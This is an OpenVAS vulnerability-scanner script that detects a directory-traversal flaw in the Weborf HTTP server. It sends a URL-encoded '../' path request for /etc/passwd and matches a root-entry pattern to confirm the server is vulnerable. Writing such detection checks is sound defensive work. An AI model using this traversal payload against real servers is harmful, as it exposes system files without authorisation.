###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_weborf_43016.nasl 8246 2017-12-26 07:29:20Z teissa $
#
# Weborf HTTP 'modURL()' Function Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Weborf is prone to a directory-traversal vulnerability because
it fails to sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary local
files within the context of the webserver. Information harvested may
aid in launching further attacks.

Weborf 0.12.2 and prior versions are vulnerable.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100788");
 script_version("$Revision: 8246 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-26 08:29:20 +0100 (Tue, 26 Dec 2017) $");
 script_tag(name:"creation_date", value:"2010-09-07 15:26:31 +0200 (Tue, 07 Sep 2010)");
 script_bugtraq_id(43016);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("Weborf HTTP 'modURL()' Function Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/43016");
 script_xref(name : "URL" , value : "http://galileo.dmi.unict.it/wiki/weborf/doku.php?id=news:released_0.12.1");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_weborf_webserver_detect.nasl", "gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("Weborf/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:8080);

banner = get_http_banner(port:port);
if("Server: Weborf" >!< banner)exit(0);

url = string("/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"); 

  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
     
    security_message(port:port);
    exit(0);

  }

exit(0);
